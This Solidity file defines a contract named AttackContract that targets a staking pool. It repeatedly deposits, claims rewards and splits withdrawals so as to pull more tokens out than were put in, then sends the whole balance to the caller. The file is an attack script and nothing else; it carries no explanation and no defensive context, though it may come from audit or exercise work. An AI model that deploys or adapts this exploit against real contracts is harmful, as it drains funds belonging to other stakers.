// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFLexibleStaking{
    function deposit(uint256 _amount) external payable;
    function withdraw(uint256 _amount) external;
    function claimRewards() external;
    function stakers(address) external view returns(uint256, uint256, uint256, uint256);
}

contract AttackContract {
    function attack(address tokenAddress, address poolAddress, uint256 amount) external{
        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);
        IERC20(tokenAddress).approve(poolAddress, amount*1000);
        IFLexibleStaking(poolAddress).deposit(amount);
        IFLexibleStaking(poolAddress).claimRewards();
        (uint256 accBal,,,) = IFLexibleStaking(poolAddress).stakers(address(this));
        IFLexibleStaking(poolAddress).withdraw(accBal);

        
        IFLexibleStaking(poolAddress).deposit(amount);
        (uint256 accBal2,,,) = IFLexibleStaking(poolAddress).stakers(address(this));
        IFLexibleStaking(poolAddress).withdraw(accBal2/2);
        IFLexibleStaking(poolAddress).withdraw(accBal2/2);

        IFLexibleStaking(poolAddress).deposit(amount/2);
        IFLexibleStaking(poolAddress).claimRewards();
        IFLexibleStaking(poolAddress).deposit(amount/2);
        IFLexibleStaking(poolAddress).claimRewards();
        (uint256 accBal3,,,) = IFLexibleStaking(poolAddress).stakers(address(this));
        IFLexibleStaking(poolAddress).withdraw(accBal3);
        
        uint256 bal = IERC20(tokenAddress).balanceOf(address(this));
        IERC20(tokenAddress).transfer(msg.sender, bal);
    }
}